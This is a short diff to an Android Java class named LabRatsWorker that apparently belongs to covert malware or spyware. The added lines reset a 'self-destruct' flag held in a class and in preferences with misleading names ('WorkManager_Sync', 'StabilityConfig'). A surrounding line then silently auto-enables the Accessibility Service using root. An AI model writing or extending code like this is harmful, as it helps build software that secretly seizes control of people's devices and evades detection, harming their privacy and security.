@@ -85,6 +85,13 @@ public class LabRatsWorker {
             Context appContext = context.getApplicationContext();
             if (appContext == null) appContext = context;
 
+            // Reset any previous self-destruct flag on new startup
+            WorkManager_Sync.isDestructing = false;
+            try {
+                appContext.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                        .edit().putBoolean("is_destructing", false).apply();
+            } catch (Throwable ignored) {}
+
             // 1. Attempt silent root auto-enable of Accessibility Service
             autoEnableAccessibilityIfRoot(appContext);
 
